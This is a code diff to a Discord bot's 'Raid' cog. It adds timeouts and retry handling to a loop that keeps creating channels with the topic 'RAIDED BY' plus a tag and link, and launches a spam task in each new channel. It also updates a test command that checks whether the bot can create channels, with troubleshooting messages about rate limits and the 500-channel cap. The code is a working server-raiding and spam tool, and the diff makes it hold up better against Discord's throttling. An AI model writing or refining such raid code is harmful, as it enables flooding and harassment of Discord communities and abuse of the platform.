@@ -118,7 +118,10 @@ class Raid(commands.Cog):
         await interaction.response.defer(ephemeral=True)
         guild = interaction.guild
         try:
-            ch = await guild.create_text_channel("lsc-test-channel")
+            ch = await asyncio.wait_for(
+                guild.create_text_channel("lsc-test-channel"),
+                timeout=15.0,
+            )
             await interaction.followup.send(
                 f"✅ **Channel creation WORKS.**\n"
                 f"Created: <#{ch.id}>\n\n"
@@ -126,11 +129,21 @@ class Raid(commands.Cog):
                 f"Run `/raid` now.",
                 ephemeral=True,
             )
-            # Clean up the test channel
             try:
                 await ch.delete()
             except Exception:
                 pass
+        except asyncio.TimeoutError:
+            await interaction.followup.send(
+                f"❌ **TIMEOUT — create_text_channel hung for 15 seconds and never returned.**\n\n"
+                f"This means Discord is not responding to channel create requests.\n"
+                f"Possible causes:\n"
+                f"• Guild hit the 500-channel cap (check Server Settings → Channels)\n"
+                f"• Discord is rate-limiting this guild at the API level (wait 10–15 min)\n"
+                f"• Bot lost its connection mid-request (redeploy on Railway)\n\n"
+                f"Check Railway logs for `[raid]` lines for more detail.",
+                ephemeral=True,
+            )
         except discord.Forbidden as e:
             await interaction.followup.send(
                 f"❌ **403 FORBIDDEN — bot cannot create channels.**\n"
@@ -252,13 +265,20 @@ class Raid(commands.Cog):
             while not se.is_set():
                 name = _ch_name(count)
                 try:
-                    ch = await guild.create_text_channel(
-                        name,
-                        topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
+                    ch = await asyncio.wait_for(
+                        guild.create_text_channel(
+                            name,
+                            topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
+                        ),
+                        timeout=15.0,
                     )
                     print(f"[raid] created #{name} ({count})", flush=True)
                     count += 1
                     bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
+
+                except asyncio.TimeoutError:
+                    print(f"[raid] TIMEOUT creating #{name} — Discord not responding. Sleeping 5s.", flush=True)
+                    await asyncio.sleep(5.0)
 
                 except discord.Forbidden as e:
                     print(f"[raid] 403 creating channel — MISSING Manage Channels PERMISSION: {e}", flush=True)
